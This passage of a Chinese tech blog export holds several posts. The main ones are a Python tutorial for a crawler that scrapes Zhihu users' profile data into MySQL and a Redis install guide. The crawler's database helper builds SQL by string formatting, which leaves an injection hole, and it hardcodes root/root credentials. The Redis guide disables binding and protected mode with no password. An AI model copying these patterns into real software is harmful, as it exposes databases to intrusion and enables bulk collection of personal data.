<blockquote>
<p><strong>这两个参数主要针对mysql驱动版本在5.0.2以上可使用。</strong></p>
<p>在oracle中是不需要使用这两个参数，因为oracle jdbc驱动默认实现是不将数据直接cache到java内存，在oracle 也可以直接使用分页</p>
</blockquote>
<h3 id="使用spring-batch需要注意的问题"><a href="#使用spring-batch需要注意的问题" class="headerlink" title="使用spring-batch需要注意的问题"></a>使用spring-batch需要注意的问题</h3><p>在使用spring-batch的JdbcCursorItemReader时，这个类默认会去校验cursor的位置，那么我们需要设置不校验</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reader.setVerifyCursorPosition(<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> jdbc </tag>
            
            <tag> 1000w </tag>
            
            <tag> cursor </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python简易爬虫]]></title>
      <url>/2017/python-simple-spider/</url>
      <content type="html"><![CDATA[<p>这篇文章主要讲解 python如何实现简易爬虫</p>
<h2 id="爬虫流程"><a href="#爬虫流程" class="headerlink" title="爬虫流程"></a>爬虫流程</h2><p>打开种子url ——&gt; 获取种子url页面中所有的url ——&gt; 判断是否被爬取过，未爬取过的url添加到url列表中 ——&gt; 解析页面中需要的信息 ——&gt; 写入数据库<br><a id="more"></a><br> 上述流程中可以抽象出5个对象：</p>
<ul>
<li>bootstrap 启动器</li>
<li>downloader 下载器</li>
<li>parser 解析器</li>
<li>url_manager url管理器</li>
<li>outputer 输出器</li>
</ul>
<h2 id="启动器-main-py"><a href="#启动器-main-py" class="headerlink" title="启动器(main.py)"></a>启动器(main.py)</h2><p>先看启动器是如何实现的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Created on 2017/9/23</span></span><br><span class="line"><span class="string">@author: tt</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> spider_outputer</span><br><span class="line"><span class="keyword">import</span> spider_parser</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> spider_downloader</span><br><span class="line"><span class="keyword">import</span> spider_url_manager</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.urls = spider_url_manager.UrlManager()</span><br><span class="line">        self.downloader = spider_downloader.Downloader()</span><br><span class="line">        self.outputer = spider_outputer.Outputer()</span><br><span class="line">        self.parser = spider_parser.Parser()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">craw</span><span class="params">(self, root_url)</span>:</span></span><br><span class="line">        self.urls.add_new_url(root_url)</span><br><span class="line">        count = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> self.urls.has_new_url():</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                new_url = self.urls.get_new_url()</span><br><span class="line">                print(<span class="string">'craw %d : %s'</span> % (count, new_url))</span><br><span class="line">                html_content = self.downloader.download(new_url)</span><br><span class="line">                new_urls, new_data = self.parser.parser(new_url, html_content)</span><br><span class="line">                self.urls.add_new_urls(new_urls)</span><br><span class="line">                self.outputer.collect_data(new_data)</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                print(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    url = <span class="string">'https://www.zhihu.com/people/li-xiao-miao-70/activities'</span></span><br><span class="line">    main = Main()</span><br><span class="line">    main.craw(url)</span><br></pre></td></tr></table></figure>
<h2 id="下载器-spider-downloader-py"><a href="#下载器-spider-downloader-py" class="headerlink" title="下载器(spider_downloader.py)"></a>下载器(spider_downloader.py)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Created on 2017/9/23</span></span><br><span class="line"><span class="string">@author: tt</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">user_agent = <span class="string">'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Downloader</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">download</span><span class="params">(self, url)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> url <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">        _url = quote(url, safe=string.printable)</span><br><span class="line">        req = request.Request(_url, headers=&#123;<span class="string">'User-Agent'</span>: user_agent&#125;)</span><br><span class="line">        response = request.urlopen(req)</span><br><span class="line">        <span class="keyword">if</span> response.getcode() != <span class="number">200</span>:</span><br><span class="line">            print(<span class="string">"request bad"</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">        html = response.read()</span><br><span class="line">        <span class="keyword">return</span> html.decode(<span class="string">'utf8'</span>)</span><br></pre></td></tr></table></figure>
<h2 id="解析器-spider-parser-py"><a href="#解析器-spider-parser-py" class="headerlink" title="解析器(spider_parser.py)"></a>解析器(spider_parser.py)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Created on 2017/9/23</span></span><br><span class="line"><span class="string">@author: tt</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> user_info</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parser</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parser</span><span class="params">(self, page_url, html_content)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> page_url <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> html_content <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        soup = BeautifulSoup(html_content, <span class="string">"html.parser"</span>)</span><br><span class="line">        new_urls = self._get_new_urls(page_url, soup)</span><br><span class="line">        new_data = self._get_new_data(page_url, soup)</span><br><span class="line">        <span class="keyword">return</span> new_urls, new_data</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_get_new_urls</span><span class="params">(self, page_url, soup)</span>:</span></span><br><span class="line">        new_urls = set()</span><br><span class="line">        links = soup.find_all(<span class="string">'a'</span>)</span><br><span class="line">        <span class="keyword">for</span> link <span class="keyword">in</span> links:</span><br><span class="line">            new_url = link.get(<span class="string">'href'</span>)</span><br><span class="line">            new_full_url = parse.urljoin(page_url, new_url)</span><br><span class="line">            new_urls.add(new_full_url)</span><br><span class="line">        <span class="keyword">return</span> new_urls</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_get_new_data</span><span class="params">(self, page_url, soup)</span>:</span></span><br><span class="line">        ret_data = []</span><br><span class="line">        author_infos = soup.find_all(class_=<span class="string">'AuthorInfo'</span>)</span><br><span class="line">        print(len(author_infos))</span><br><span class="line">        <span class="keyword">for</span> author_info <span class="keyword">in</span> author_infos:</span><br><span class="line">            user_id = author_info.find(class_=<span class="string">'UserLink-link'</span>).get(<span class="string">'href'</span>)</span><br><span class="line">            user_id = user_id[user_id.find(<span class="string">'e/'</span>) + <span class="number">2</span>:]</span><br><span class="line">            photo = author_info.find(class_=<span class="string">'AuthorInfo-avatar'</span>).get(<span class="string">'srcset'</span>)</span><br><span class="line">            pos = photo.find(<span class="string">' '</span>)</span><br><span class="line">            photo = photo[:pos]</span><br><span class="line">            name = author_info.find(<span class="string">'meta'</span>, attrs=&#123;<span class="string">"itemprop"</span>: <span class="string">"name"</span>&#125;).get(<span class="string">'content'</span>)</span><br><span class="line">            profession = author_info.find(class_=<span class="string">'AuthorInfo-badgeText'</span>).get_text()</span><br><span class="line"></span><br><span class="line">            user = user_info.UserInfo(user_id, name, photo, profession)</span><br><span class="line">            ret_data.append(user)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ret_data</span><br></pre></td></tr></table></figure>
<h2 id="url管理器-spider-url-manager-py"><a href="#url管理器-spider-url-manager-py" class="headerlink" title="url管理器(spider_url_manager.py)"></a>url管理器(spider_url_manager.py)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Created on 2017/9/23</span></span><br><span class="line"><span class="string">@author: tt</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UrlManager</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.visited_url = set()</span><br><span class="line">        self.visit_url = set()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_new_url</span><span class="params">(self, url)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> url <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> url <span class="keyword">not</span> <span class="keyword">in</span> self.visit_url <span class="keyword">and</span> url <span class="keyword">not</span> <span class="keyword">in</span> self.visited_url:</span><br><span class="line">            self.visit_url.add(url)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">has_new_url</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> len(self.visit_url) != <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_new_urls</span><span class="params">(self, urls)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> urls <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> len(urls) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">            self.add_new_url(url)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_new_url</span><span class="params">(self)</span>:</span></span><br><span class="line">        new_url = self.visit_url.pop()</span><br><span class="line">        self.visited_url.add(new_url)</span><br><span class="line">        <span class="keyword">return</span> new_url</span><br></pre></td></tr></table></figure>
<h2 id="输出器-spider-outputer-py"><a href="#输出器-spider-outputer-py" class="headerlink" title="输出器(spider_outputer.py)"></a>输出器(spider_outputer.py)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Created on 2017/9/23</span></span><br><span class="line"><span class="string">@author: tt</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> user_dao</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Outputer</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.user_dao = user_dao.UserDao()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">collect_data</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            print(<span class="string">'None'</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">                self.user_dao.add_user(d)</span><br></pre></td></tr></table></figure>
<h2 id="其他类"><a href="#其他类" class="headerlink" title="其他类"></a>其他类</h2><h3 id="数据库帮助类-db-helper-py"><a href="#数据库帮助类-db-helper-py" class="headerlink" title="数据库帮助类(db_helper.py)"></a>数据库帮助类(db_helper.py)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Created on 2017/9/23</span></span><br><span class="line"><span class="string">@author: tt</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DbHelper</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_get_connection</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> pymysql.Connect(host=<span class="string">'127.0.0.1'</span>, user=<span class="string">'root'</span>, passwd=<span class="string">'root'</span>, db=<span class="string">'crawler'</span>, port=<span class="number">3306</span>, charset=<span class="string">'utf8'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">execute_update</span><span class="params">(self, sql, params)</span>:</span></span><br><span class="line">        connectin = self._get_connection()</span><br><span class="line">        cursor = connectin.cursor()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> params <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">                s = sql</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                s = (sql % params)</span><br><span class="line">            result = cursor.execute(s)</span><br><span class="line">            connectin.commit()</span><br><span class="line">            print(<span class="string">'rows:'</span>, result)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            connectin.rollback()</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            cursor.close()</span><br><span class="line">            connectin.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(self, sql, params=None)</span>:</span></span><br><span class="line">        connection = self._get_connection()</span><br><span class="line">        cursor = connection.cursor()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> params <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">                s = sql</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                s = (sql % params)</span><br><span class="line">            cursor.execute(s)</span><br><span class="line">            rows = cursor.fetchall()</span><br><span class="line">            <span class="keyword">for</span> row <span class="keyword">in</span> rows:</span><br><span class="line">                print(row)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            connection.rollback()</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            cursor.close()</span><br><span class="line">            connection.close()</span><br></pre></td></tr></table></figure>
<h3 id="用户数据访问类-user-dao-py"><a href="#用户数据访问类-user-dao-py" class="headerlink" title="用户数据访问类(user_dao.py)"></a>用户数据访问类(user_dao.py)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Created on 2017/9/23</span></span><br><span class="line"><span class="string">@author: tt</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> db_helper</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserDao</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.db = db_helper.DbHelper()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_user</span><span class="params">(self, user)</span>:</span></span><br><span class="line">        sql = <span class="string">'''INSERT IGNORE INTO zhihu_user(user_id, photo, name, profession) values('%s', '%s', '%s', '%s')'''</span></span><br><span class="line">        params = (user.user_id, user.photo, user.name, user.profession)</span><br><span class="line">        self.db.execute_update(sql=sql, params=params)</span><br></pre></td></tr></table></figure>
<h3 id="用户信息类-user-info-py"><a href="#用户信息类-user-info-py" class="headerlink" title="用户信息类(user_info.py)"></a>用户信息类(user_info.py)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Created on 2017/9/23</span></span><br><span class="line"><span class="string">@author: tt</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, user_id, name, photo, profession)</span>:</span></span><br><span class="line">        self.user_id = user_id</span><br><span class="line">        self.name = name</span><br><span class="line">        self.photo = photo</span><br><span class="line">        self.profession = profession</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'UserInfo(name='</span> + self.name + <span class="string">', photo='</span> + self.photo + <span class="string">", profession="</span> + self.profession + <span class="string">')\n'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.__str__()</span><br></pre></td></tr></table></figure>
<p>在python中print在输出对象是调用的是对象的_<em>str_</em>函数</p>
<p>这个小的demo爬取的是知乎用户id，头像，名称，职业信息</p>
]]></content>
      
        <categories>
            
            <category> python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python </tag>
            
            <tag> spider </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[redis-3.2.10 单机安装]]></title>
      <url>/2017/redis-single-install/</url>
      <content type="html"><![CDATA[<p>这篇文章主要讲解 redis-3.2.10 单机安装</p>
<h3 id="1-下载安装包"><a href="#1-下载安装包" class="headerlink" title="1. 下载安装包"></a>1. 下载安装包</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-3.2.10.tar.gz</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h3 id="2-安装依赖"><a href="#2-安装依赖" class="headerlink" title="2. 安装依赖"></a>2. 安装依赖</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y gcc-c++ tcl</span><br></pre></td></tr></table></figure>
<h3 id="3-解压编译"><a href="#3-解压编译" class="headerlink" title="3. 解压编译"></a>3. 解压编译</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf redis-3.2.10.tar.gz -C /usr/local/</span><br><span class="line">cd /usr/local/redis-3.2.10</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
<blockquote>
<p>如果出现 “redis zmalloc.h:50:31: 致命错误：jemalloc/jemalloc.h：没有那个文件或目录” 使用 make MALLOC=libc</p>
<h3 id="4-测试"><a href="#4-测试" class="headerlink" title="4. 测试"></a>4. 测试</h3></blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make test</span><br></pre></td></tr></table></figure>
<h3 id="5-安装"><a href="#5-安装" class="headerlink" title="5. 安装"></a>5. 安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make install</span><br></pre></td></tr></table></figure>
<h3 id="6-修改配置文件"><a href="#6-修改配置文件" class="headerlink" title="6. 修改配置文件"></a>6. 修改配置文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cp redis.conf redis.conf.sample</span><br><span class="line">vi redis.conf</span><br><span class="line"></span><br><span class="line">daemonize yes</span><br><span class="line"><span class="meta">#</span>bind 127.0.0.1</span><br><span class="line">protected-mode no</span><br><span class="line">dir /usr/local/redis-3.2.10/</span><br><span class="line"></span><br><span class="line">:wq</span><br></pre></td></tr></table></figure>
<h3 id="7-启动redis"><a href="#7-启动redis" class="headerlink" title="7. 启动redis"></a>7. 启动redis</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server /usr/local/redis-3.2.10/redis.conf</span><br></pre></td></tr></table></figure>
<h3 id="8-客户端测试链接"><a href="#8-客户端测试链接" class="headerlink" title="8. 客户端测试链接"></a>8. 客户端测试链接</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 127.0.0.1 -p 6379</span><br><span class="line">127.0.0.1:6379&gt; ping</span><br><span class="line">PONG</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> redis </category>
            
        </categories>
        
        
        <tags>
            
            <tag> redis </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[httpclient使用cookie]]></title>
      <url>/2017/httpclient-cookie/</url>
      <content type="html"><![CDATA[<p>这篇文章主要讲解 httpclient如何使用cookie</p>
